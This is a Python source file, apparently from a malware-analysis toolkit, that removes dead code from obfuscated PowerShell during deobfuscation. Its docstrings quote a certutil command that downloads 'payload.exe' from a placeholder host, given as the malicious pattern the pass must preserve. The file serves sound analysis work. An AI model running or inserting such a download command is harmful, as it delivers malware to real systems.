"""
Eliminate dead code from PowerShell scripts after constant folding.
"""
from __future__ import annotations

from refinery.lib.scripts import (
    Block,
    Expression,
    Node,
    Statement,
    Transformer,
)
from refinery.lib.scripts.analysis.dominance import DominatorModel
from refinery.lib.scripts.ps1.analysis.cache import Ps1ModelCache, model_cache
from refinery.lib.scripts.ps1.analysis.effects import (
    OutputSink,
    is_fault_free,
    is_side_effect_free,
    output_sink,
)
from refinery.lib.scripts.ps1.analysis.types import TypeOracle
from refinery.lib.scripts.ps1.analysis.values import is_truthy, unwrap_integer
from refinery.lib.scripts.ps1.ast import get_body, is_builtin_variable, unwrap_parens
from refinery.lib.scripts.ps1.data import COMPARISON_OPS, KNOWN_CMDLETS
from refinery.lib.scripts.ps1.deobfuscation.helpers import (
    store_dropped_to_value,
    switch_matches,
)
from refinery.lib.scripts.ps1.deobfuscation.removal import Ps1RemovalPlan
from refinery.lib.scripts.ps1.model import (
    Ps1AssignmentExpression,
    Ps1BinaryExpression,
    Ps1BreakStatement,
    Ps1CatchClause,
    Ps1CommandArgument,
    Ps1CommandInvocation,
    Ps1ContinueStatement,
    Ps1DoLoop,
    Ps1ExpressionStatement,
    Ps1ForLoop,
    Ps1IfStatement,
    Ps1IntegerLiteral,
    Ps1RealLiteral,
    Ps1ScopeModifier,
    Ps1ScriptBlock,
    Ps1StringLiteral,
    Ps1SwitchStatement,
    Ps1ThrowStatement,
    Ps1TrapStatement,
    Ps1TryCatchFinally,
    Ps1UnaryExpression,
    Ps1Variable,
    Ps1WhileLoop,
)

_PATH_EXTENSIONS = frozenset({'.exe', '.ps1', '.cmd', '.bat', '.com', '.vbs', '.msi'})


def _carries_assignment_marker(cmd: Ps1CommandInvocation, name: str) -> bool:
    """
    Whether `cmd` is the syntactic residue of an assignment the obfuscator emitted where a command
    was expected. Both spellings have to be recognized because the lexer splits them differently:
    `foo =5` becomes a name and one `=`-prefixed argument, while `0042DsKaho=8602057` stays a single
    bareword name, the digit-leading form being the one an obfuscator emits most.

    The split spelling is recognized only when the residue is *everything* the invocation carries:
    one argument, written without quotes, reached without a call operator. Each of those is a thing
    an assignment cannot produce and a command line can — `certutil -urlcache -split -f
    =http://host/payload.exe` carries three more tokens, `certutil '=http://host/payload.exe'`
    quotes the one it has, and `& msiexec =foo` is in command position by an operator that is legal
    nowhere else — and matching any of them erases the very `try { <LOLBin> } catch { }` shape this
    predicate was rewritten to stop erasing.
    """
    if '=' in name:
        return True
    if cmd.invocation_operator or len(cmd.arguments) != 1:
        return False
    argument = cmd.arguments[0]
    value = argument.value if isinstance(argument, Ps1CommandArgument) else argument
    return (
        isinstance(value, Ps1StringLiteral)
        and value.raw == value.value
        and value.value.startswith('=')
    )


def _is_injected_noise_bareword(expr: Expression, oracle: TypeOracle) -> bool:
    """
    Return `True` when `expr` is a bareword command carrying an assignment marker and no argument
    that does anything — the shape an obfuscator injects to pad a script, which the passes below
    delete along with the `try` wrapped around it.

    This is a guess about an artifact, not a proof about the command. An `=` does not establish that
    the name resolves to nothing, and a native binary invoked this way is still dropped, so the
    marker is the entire basis for the guess and nothing here may widen past it. The rule this
    replaced asked instead whether the metadata knew the name, which read absence from a
    host-collected table as proof of non-existence: every common LOLBin is missing from that table,
    so `try { certutil -urlcache -split -f http://host/payload.exe } catch { }` erased itself.

    The whole guess rests on the command table being the one the metadata describes, so it is only
    made in a closed world. A script that dot-sources a file, imports a module, defines an alias or
    runs `iex` can make any bareword resolve to real code, and only the redefinitions spelled as a
    `function` reach the shadow set — the world verdict covers the rest, which is why the
    precondition sits here rather than another name-by-name list.
    """
    if not isinstance(expr, Ps1CommandInvocation):
        return False
    if not isinstance(expr.name, Ps1StringLiteral):
        return False
    if not oracle.world_closed_at(expr):
        return False
    name = expr.name.value
    name_lower = name.lower()
    if not _carries_assignment_marker(expr, name):
        return False
    if name_lower in KNOWN_CMDLETS or not oracle.may_trust_command_name(name_lower, expr):
        return False
    if any(sep in name for sep in ('\\', '/', ':')):
        return False
    if any(name_lower.endswith(ext) for ext in _PATH_EXTENSIONS):
        return False
    if name.startswith('.') or name.startswith('~'):
        return False
    for arg in expr.arguments:
        value = arg.value if isinstance(arg, Ps1CommandArgument) else arg
        if value is not None and not is_side_effect_free(value, oracle):
            return False
    return True


def _hoisted_initializer(expr: Expression) -> Ps1ExpressionStatement:
    """
    The statement a `for` initializer becomes once its loop is pruned away.

    PowerShell evaluates the initializer in a void context, so its value reaches nobody:
    `for (5; $False; ) { }` and `for ((Get-Date); $False; ) { }` both put nothing on the output,
    where the bare statements `5` and `(Get-Date)` put a value there. Hoisting one plainly would
    therefore make the deobfuscated script print what the original never printed — the mirror image
    of deleting output, and no less wrong.

    An assignment already swallows its own value and is hoisted as written. Everything else is
    wrapped, and the wrapper is `StatementEffect.DISCARD`, so a later pass drops it when the work
    inside is pure and keeps it when it is not.
    """
    if isinstance(expr, Ps1AssignmentExpression):
        return Ps1ExpressionStatement(expression=expr)
    return store_dropped_to_value(expr)


def _try_body_survivors(body: list[Statement], oracle: TypeOracle) -> list[Statement] | None:
    """
    What a try body leaves behind once its construct is dissolved, or `None` when it cannot be.

    A statement survives dissolution only if it means the same thing outside the construct as
    inside it, which asks two questions of it and not one. It must not raise, or the empty `catch`
    that was swallowing the error is gone and the throw reaches the caller. And it must keep its
    output, so a statement that can emit is carried over rather than dropped. `is_fault_free`
    answers both at once: what it accepts cannot raise and is carried, and a body holding anything
    else keeps its construct.

    The one exception is a bareword `_is_injected_noise_bareword` recognizes as obfuscator padding,
    which is dropped rather than carried. That is a heuristic and it is the reason this returns a
    body that is *believed* inert rather than one proven so; a bareword the script redefines runs
    that definition and is never such a guess, which is one of the facts `oracle` carries.
    """
    survivors: list[Statement] = []
    for stmt in body:
        if not isinstance(stmt, Ps1ExpressionStatement):
            return None
        if stmt.expression is None:
            continue
        if is_fault_free(stmt.expression):
            survivors.append(stmt)
            continue
        if _is_injected_noise_bareword(stmt.expression, oracle):
            continue
        return None
    return survivors


def _evaluate_for_condition(node: Ps1ForLoop) -> bool | None:
    """
    Try to evaluate a for-loop condition at loop entry by substituting the initial value of the
    loop variable into the comparison. Returns the boolean result, or `None` if the pattern does not
    match.
    """
    init = node.initializer
    cond = node.condition
    if not isinstance(init, Ps1AssignmentExpression) or init.operator != '=':
        return None
    if not isinstance(init.target, Ps1Variable):
        return None
    init_val = unwrap_integer(init.value)
    if init_val is None:
        return None
    if not isinstance(cond, Ps1BinaryExpression):
        return None
    op_fn = COMPARISON_OPS.get(cond.operator.lower())
    if op_fn is None:
        return None
    var_name = init.target.name.lower()
    var_scope = init.target.scope
    left_val = _resolve_side(cond.left, var_name, var_scope, init_val.value)
    right_val = _resolve_side(cond.right, var_name, var_scope, init_val.value)
    if left_val is None or right_val is None:
        return None
    return bool(op_fn(left_val, right_val))


def _resolve_side(
    node, var_name: str, var_scope: Ps1ScopeModifier, init_val: int,
) -> int | None:
    """
    Resolve one side of a for-loop condition to an integer: if the node is the loop variable,
    return the initial value; if it is a constant integer, return that; otherwise return `None`.
    """
    node = unwrap_parens(node) if isinstance(node, Expression) else node
    if (
        isinstance(node, Ps1Variable)
        and node.name.lower() == var_name
        and node.scope == var_scope
    ):
        return init_val
    result = unwrap_integer(node)
    return result.value if result is not None else None


def _make_int_literal(value: int) -> Ps1IntegerLiteral:
    return Ps1IntegerLiteral(value=value, raw=str(value))


def _is_counter_variable(node, var_name: str, var_scope: Ps1ScopeModifier) -> bool:
    node = unwrap_parens(node) if isinstance(node, Expression) else node
    return (
        isinstance(node, Ps1Variable)
        and node.name.lower() == var_name
        and node.scope == var_scope
    )


def _counter_delta(iterator, var_name: str, var_scope: Ps1ScopeModifier) -> int | None:
    """
    Return the constant per-iteration change a for-loop iterator applies to the loop variable, or
    `None` when the iterator is not a nonzero constant step on that single variable (`$i++`, `$i--`,
    `$i += k`, `$i -= k`).
    """
    if isinstance(iterator, Ps1UnaryExpression) and iterator.operator in ('++', '--'):
        if _is_counter_variable(iterator.operand, var_name, var_scope):
            return 1 if iterator.operator == '++' else -1
        return None
    if isinstance(iterator, Ps1AssignmentExpression) and iterator.operator in ('+=', '-='):
        if not _is_counter_variable(iterator.target, var_name, var_scope):
            return None
        step = unwrap_integer(iterator.value)
        if step is None:
            return None
        delta = step.value if iterator.operator == '+=' else -step.value
        return delta or None
    return None


def _counter_condition(cond, var_name: str, var_scope: Ps1ScopeModifier):
    """
    Return `(predicate, bound)` where `predicate` maps an integer loop-variable value to the truth
    of the for-loop condition and `bound` is the constant it is compared against, or `None` when the
    condition is not a comparison between the loop variable and a constant integer (`$i <cmp> C` or
    `C <cmp> $i`). The bound lets the caller size a simulation cap to the loop's real trip count.
    """
    if not isinstance(cond, Ps1BinaryExpression):
        return None
    op_fn = COMPARISON_OPS.get(cond.operator.lower())
    if op_fn is None:
        return None
    left_int = unwrap_integer(cond.left)
    right_int = unwrap_integer(cond.right)
    if _is_counter_variable(cond.left, var_name, var_scope) and right_int is not None:
        bound = right_int.value
        return (lambda value: bool(op_fn(value, bound))), bound
    if _is_counter_variable(cond.right, var_name, var_scope) and left_int is not None:
        bound = left_int.value
        return (lambda value: bool(op_fn(bound, value))), bound
    return None


def _simulate_empty_for_terminal(node: Ps1ForLoop) -> tuple[Ps1Variable, int] | None:
    """
    For an empty-bodied `for` loop driven by a single integer counter, return `(variable, terminal)`
    giving the value the counter holds once the loop exits, or `None` when the loop is not a
    provably-terminating linear counter (non-constant initializer/bound, `for (;;)`, a
    non-constant-step iterator, or a condition that never turns false). The counter is stepped
    exactly as PowerShell evaluates the loop — check the condition, then apply the iterator — so the
    terminal value is exact, including the zero-iteration case where the counter keeps its initial
    value.
    """
    init = node.initializer
    if not isinstance(init, Ps1AssignmentExpression) or init.operator != '=':
        return None
    if not isinstance(init.target, Ps1Variable):
        return None
    init_int = unwrap_integer(init.value)
    if init_int is None:
        return None
    variable = init.target
    var_name = variable.name.lower()
    var_scope = variable.scope
    delta = _counter_delta(node.iterator, var_name, var_scope)
    if delta is None:
        return None
    condition = _counter_condition(node.condition, var_name, var_scope)
    if condition is None:
        return None
    predicate, bound = condition
    # A terminating linear counter reaches the bound within `distance / |step|` iterations; a couple
    # extra guard against off-by-one and the exact-hit (`-ne`/`-eq`) cases. Exceeding this proves
    # the condition never turns false (a wrong-direction step), so the loop is infinite and left
    # intact. The absolute cap prevents pathological samples (e.g. bound = 2 billion) from hanging
    # the pass.
    cap = min(abs(bound - init_int.value) // abs(delta) + 2, 100_000)
    value = init_int.value
    iterations = 0
    while predicate(value):
        value += delta
        iterations += 1
        if iterations > cap:
            return None
    return variable, value


def _body_breaks_unconditionally(body: list[Statement]) -> bool:
    """
    Return `True` if the last statement in the body is an unlabeled break and the body contains no
    continue statements at any nesting depth. Such a loop body executes exactly once.
    """
    if not body:
        return False
    last = body[-1]
    if not isinstance(last, Ps1BreakStatement) or last.label is not None:
        return False
    for stmt in body[:-1]:
        for node in stmt.walk():
            if isinstance(node, (Ps1BreakStatement, Ps1ContinueStatement)):
                return False
    return True


_NO_LITERAL = object()


def _switch_literal(node):
    """
    Extract the constant `int`/`str`/`bool` value a switch value or clause condition compares with,
    or `_NO_LITERAL` when it is not a compile-time constant.
    """
    node = unwrap_parens(node)
    if isinstance(node, (Ps1IntegerLiteral, Ps1RealLiteral, Ps1StringLiteral)):
        return node.value
    if is_builtin_variable(node, {'true'}):
        return True
    if is_builtin_variable(node, {'false'}):
        return False
    return _NO_LITERAL


def _switch_clause_body(body: list[Statement]) -> tuple[list[Statement], bool] | None:
    """
    Return the statements of a matched switch clause together with a flag indicating whether the
    clause terminates the switch (a trailing `break`). Returns `None` when the body contains a
    top-level `break`/`continue` that is not a single trailing `break`, since inlining it would
    retarget the jump to an enclosing loop.
    """
    stmts = list(body)
    stop = False
    if stmts and isinstance(stmts[-1], Ps1BreakStatement):
        stmts = stmts[:-1]
        stop = True
    for stmt in stmts:
        if isinstance(stmt, (Ps1BreakStatement, Ps1ContinueStatement)):
            return None
    return stmts, stop


class Ps1DeadCodeElimination(Transformer):
    """
    Remove unreachable code guarded by constant boolean conditions and resolve switch statements
    on constant values.
    """

    def visit(self, node: Node):
        # The oracle is captured once, not re-read per body: `set_body` below advances the tree
        # version, so a per-call-site lookup would rebuild the whole-tree walk after every prune, and
        # could flip the verdict mid-pass. Capturing errs the safe way — this pass only removes or
        # hoists nodes and never introduces a leak, so a stale verdict is always the more open one.
        # The cache itself is threaded so that reachability is read fresh per body: a reachability
        # verdict must reflect the current tree, and reading it through the version-aware cache
        # rebuilds only after a body has actually changed.
        cache = model_cache(self, node)
        oracle = cache.oracle
        for parent in list(node.walk()):
            sink = output_sink(parent)
            if sink is None or sink is OutputSink.CAPTURED:
                continue
            if self._prune_body(parent, oracle, cache):
                self.mark_changed()

    def _prune_body(self, parent: Node, oracle: TypeOracle, cache: Ps1ModelCache) -> bool:
        """
        Rewrite each statement of one body into what its condition has already been proved to make
        of it, or leave it alone.

        This pass used to also drop bare constants wherever it read the body's value as unobserved,
        which was the narrowest slice of `StatementEffect.OUTPUT` and still a slice of it: `42` at
        the script root prints `42`, and `if ($x) { 42 }` prints it too. Reading a body's value as
        unobserved is not something position can say — only
        `refinery.lib.scripts.ps1.analysis.effects.Ps1OutputFlow` can, by resolving the destination
        across the call graph — so deleting a write to the output stream is a decision
        `refinery.lib.scripts.ps1.deobfuscation.unused.Ps1JunkStatementRemoval` owns alone, and the
        whole decision is gone from here rather than gated to nothing.

        What is left removes only constructs whose condition is already proved constant, plus
        statements the control-flow graph reports no path can reach — a statement after `return`,
        `throw` or `exit`, which never runs and so cannot be what an enclosing handler catches. Its
        removal cannot empty a body that pruning was not already entitled to empty, because a body's
        entry is always reachable.
        """
        dominance = cache.dominance
        reachable_by_graph: dict[int, frozenset[int]] = {}

        def reachable_of(graph) -> frozenset[int]:
            reach = reachable_by_graph.get(id(graph))
            if reach is None:
                reach = frozenset(dominance.reachable(graph.entry, forward=True))
                reachable_by_graph[id(graph)] = reach
            return reach

        # A handler body — a `trap`, a `catch`, or a `finally` — runs on a path this deletion does
        # not walk: a `trap` or `catch` only when the code it guards throws, so from normal flow it
        # reads as unreachable exactly when nothing threw, which is not the same as its statements
        # being dead. Emptying one here would strip a payload `_prune_trap` and `_prune_try` weigh as
        # a whole, and an empty guarded body is evidence about an earlier pass rather than about the
        # code, so the unreachability deletion stays out of every handler body.
        deletes_unreachable = not self._within_handler_body(parent)
        plan = Ps1RemovalPlan(parent, removals_may_fault=False)
        for stmt in get_body(parent):
            if (
                deletes_unreachable
                and not isinstance(stmt, Ps1TrapStatement)
                and self._is_unreachable(stmt, dominance, reachable_of)
            ):
                plan.propose(stmt, [])
                continue
            replacement = self._try_prune(stmt, oracle, dominance)
            if replacement is None:
                continue
            plan.propose(stmt, replacement)
        return plan.commit()

    @staticmethod
    def _within_handler_body(node: Node) -> bool:
        """
        Whether `node` is a body nested inside a `trap`, a `catch`, or a `finally`, up to the nearest
        control-flow-graph boundary. A statement in a `trap` or `catch` is reached only by the
        guarded code throwing, so its normal-flow unreachability says nothing about whether it is
        dead; a `finally` always runs and so is never wrongly deleted, but it is excluded with the
        others so that the whole handler decision stays with the construct-specific passes.
        """
        current = node
        while current is not None and not isinstance(current, Ps1ScriptBlock):
            parent = current.parent
            if isinstance(parent, (Ps1TrapStatement, Ps1CatchClause)):
                return True
            if isinstance(parent, Ps1TryCatchFinally) and parent.finally_block is current:
                return True
            current = parent
        return False

    @staticmethod
    def _is_unreachable(stmt: Statement, dominance: DominatorModel, reachable_of) -> bool:
        """
        Whether no path reaches any part of `stmt`. A compound statement runs when its first
        executable node is reached, so a `do`/`while` whose tail-tested condition is unreachable
        still runs its body — the statement is dead only when *every* control-flow node in its own
        graph is unreachable. A node in a nested script block is in that block's own graph and says
        nothing about whether the statement enclosing it runs, so it is not counted. A `trap` is
        excluded by the caller: its handler node is reachable only through the exceptional edges of
        the body it guards, so an unreachable handler means nothing threw, not that the declaration
        is dead — `_prune_trap` owns that decision.
        """
        located = dominance.locate(stmt)
        if located is None:
            return False
        graph = located[0]
        reachable = reachable_of(graph)
        saw_node = False
        for descendant in stmt.walk():
            found = dominance.locate(descendant)
            if found is None or found[0] is not graph:
                continue
            saw_node = True
            if id(found[1]) in reachable:
                return False
        return saw_node

    def _try_prune(
        self, stmt: Statement, oracle: TypeOracle, dominance: DominatorModel,
    ) -> list[Statement] | None:
        if isinstance(stmt, Ps1WhileLoop):
            return self._prune_while(stmt)
        if isinstance(stmt, Ps1DoLoop):
            return self._prune_do_loop(stmt)
        if isinstance(stmt, Ps1ForLoop):
            return self._prune_for(stmt)
        if isinstance(stmt, Ps1IfStatement):
            return self._prune_if(stmt)
        if isinstance(stmt, Ps1SwitchStatement):
            return self._prune_switch(stmt)
        if isinstance(stmt, Ps1TryCatchFinally):
            return self._prune_try(stmt, oracle)
        if isinstance(stmt, Ps1TrapStatement):
            return self._prune_trap(stmt, oracle, dominance)
        return None

    @staticmethod
    def _prune_while(node: Ps1WhileLoop) -> list[Statement] | None:
        truth = is_truthy(node.condition)
        if truth is False:
            return []
        if node.body is not None and _body_breaks_unconditionally(node.body.body):
            body = list(node.body.body[:-1])
            if truth is True or node.condition is None:
                return body
            return [Ps1IfStatement(clauses=[(node.condition, Block(body=body))])]
        return None

    @staticmethod
    def _prune_do_loop(node: Ps1DoLoop) -> list[Statement] | None:
        if node.body is not None:
            trivially_exits = (
                is_truthy(node.condition) is True if node.is_until
                else is_truthy(node.condition) is False
            )
            if trivially_exits:
                body = node.body.body
                if _body_breaks_unconditionally(body):
                    return list(body[:-1])
                for stmt in body:
                    for child in stmt.walk():
                        if isinstance(child, (Ps1BreakStatement, Ps1ContinueStatement)):
                            return None
                return list(body)
            if _body_breaks_unconditionally(node.body.body):
                return list(node.body.body[:-1])
        return None

    @staticmethod
    def _prune_for(node: Ps1ForLoop) -> list[Statement] | None:
        truth = _evaluate_for_condition(node)
        if truth is None:
            truth = is_truthy(node.condition)
        if truth is False:
            result: list[Statement] = []
            if node.initializer is not None:
                result.append(_hoisted_initializer(node.initializer))
            return result
        if node.body is not None and _body_breaks_unconditionally(node.body.body):
            result = []
            if node.initializer is not None:
                result.append(_hoisted_initializer(node.initializer))
            body = list(node.body.body[:-1])
            if truth is True or node.condition is None:
                result.extend(body)
            else:
                result.append(Ps1IfStatement(clauses=[(node.condition, Block(body=body))]))
            return result
        if node.body is None or not node.body.body:
            terminal = _simulate_empty_for_terminal(node)
            if terminal is not None:
                variable, value = terminal
                target = Ps1Variable(name=variable.name, scope=variable.scope)
                assignment = Ps1AssignmentExpression(
                    target=target, operator='=', value=_make_int_literal(value))
                return [Ps1ExpressionStatement(expression=assignment)]
        return None

    @staticmethod
    def _prune_if(node: Ps1IfStatement) -> list[Statement] | None:
        kept_clauses: list[tuple] = []
        for index, (condition, block) in enumerate(node.clauses):
            truth = is_truthy(condition)
            if truth is True:
                return list(block.body)
            if truth is False:
                continue
            kept_clauses.append((condition, block))
            kept_clauses.extend(node.clauses[index + 1:])
            break
        else:
            if node.else_block is not None:
                return list(node.else_block.body)
            return []
        if len(kept_clauses) == len(node.clauses):
            return None
        # A new statement rather than a clause list spliced into this one: a pass proposes an edit
        # and does not perform it, so the proposal has to be something the vetoes can compare
        # against the original. Dropping the clauses in place makes the two the same object, and a
        # payload under the `if ($false)` arm of a chain would read as having survived it.
        return [Ps1IfStatement(clauses=kept_clauses, else_block=node.else_block)]

    @staticmethod
    def _prune_switch(node: Ps1SwitchStatement) -> list[Statement] | None:
        if node.regex or node.wildcard or node.file:
            return None
        value = _switch_literal(node.value)
        if value is _NO_LITERAL:
            return None
        default_body: list[Statement] | None = None
        result: list[Statement] = []
        matched = False
        for condition, block in node.clauses:
            if condition is None:
                default_body = block.body
                continue
            cond_val = _switch_literal(condition)
            if cond_val is _NO_LITERAL:
                # A non-constant clause condition might match at runtime; cannot resolve statically.
                return None
            if switch_matches(value, cond_val, case_sensitive=node.case_sensitive):
                body = _switch_clause_body(block.body)
                if body is None:
                    return None
                stmts, stop = body
                result.extend(stmts)
                matched = True
                if stop:
                    return result
        if matched:
            return result
        if default_body is not None:
            body = _switch_clause_body(default_body)
            if body is None:
                return None
            return body[0]
        return []

    def _prune_try(self, node: Ps1TryCatchFinally, oracle: TypeOracle) -> list[Statement] | None:
        """
        Resolve a `try`/`catch`/`finally` into what its `try` body leaves behind, followed by the
        `finally` body, which always runs. An empty or absent try body needs no separate case
        because `_try_body_survivors` accepts it vacuously.

        Both routes require every `catch` clause to be empty, because a handler with a body is live
        code whose reachability this pass cannot decide. An empty try body is no license to drop
        one: emptiness here is rarely how the source was written, it is what an earlier pass left
        behind, so it is evidence about that pass and not about whether the original body could
        throw.

        What an empty `catch` licenses is narrower than it looks, and this used to take it as broad.
        It licenses *deleting* a statement that raises, since the error was being swallowed either
        way. It does not license moving one out, and every statement here is moved, not deleted —
        so the gate is fault-freedom rather than purity, and a body whose statements merely look
        harmless keeps its construct.
        """
        for clause in node.catch_clauses:
            if clause.body is not None and clause.body.body:
                return None
        try_body = node.try_block.body if node.try_block is not None else []
        survivors = _try_body_survivors(try_body, oracle)
        if survivors is None:
            return None
        finally_body = node.finally_block.body if node.finally_block is not None else []
        return survivors + list(finally_body)

    def _prune_trap(
        self, node: Ps1TrapStatement, oracle: TypeOracle, dominance: DominatorModel,
    ) -> list[Statement] | None:
        """
        Remove a `trap` handler whose body produces no observable output and whose scope cannot
        throw a terminating error the trap would intercept. A trap only runs when the code it guards
        throws; injected-noise traps (`trap { continue }`, an empty `trap {}`, `trap { break }`)
        merely swallow or re-raise without emitting anything, so deleting them is invisible — but
        only where nothing they guard actually throws. A body that performs a side effect — a real
        logging handler such as `trap { Write-Host 'err' }` — keeps the trap intact.

        The first gate is control flow: the removal rests on the guarded code never throwing, so a
        `throw` the control-flow graph reports as reachable in the trap's scope makes the trap
        load-bearing and keeps it. Without it, `trap { continue }; throw 'e'; Write-Host 'after'`
        would have its handler removed, the throw would escape, and the statement the trap resumes
        into would never run. A terminating error that is not a `throw` statement — a failing cast,
        a method call — is modelled as ordinary fall-through by this graph and is not seen here; that
        residual is no wider than before this gate existed.

        The second gate is purity, not emission: the removal is not provable under strict semantics
        at all, and under the premise that the guarded code does not throw, a body that merely emits
        never runs either, so `trap { 5 }` and `trap { Get-Date }` are dropped alike. Only a body
        whose statements would do something observable is worth keeping the trap for.
        """
        if self._intercepts_a_reachable_throw(node, dominance):
            return None
        body = node.body.body if node.body is not None else []
        for stmt in body:
            if isinstance(stmt, (Ps1BreakStatement, Ps1ContinueStatement)):
                if stmt.label is not None:
                    return None
                continue
            if isinstance(stmt, Ps1ExpressionStatement):
                if stmt.expression is None or is_side_effect_free(stmt.expression, oracle):
                    continue
            return None
        return []

    @staticmethod
    def _intercepts_a_reachable_throw(node: Ps1TrapStatement, dominance: DominatorModel) -> bool:
        """
        Whether a `throw` the control-flow graph reports as reachable lies in the scope this trap
        guards. A trap catches for the whole body it is declared in, which is exactly the body whose
        graph it belongs to, so the reachable `throw` statements of that graph are the ones it would
        intercept. A trap this cannot place — one with no graph node — is kept, which is the safe
        direction.
        """
        located = dominance.locate(node)
        if located is None:
            return True
        graph, _ = located
        reachable = dominance.reachable(graph.entry, forward=True)
        return any(
            id(cfg_node) in reachable and isinstance(cfg_node.element, Ps1ThrowStatement)
            for cfg_node in graph.nodes
        )
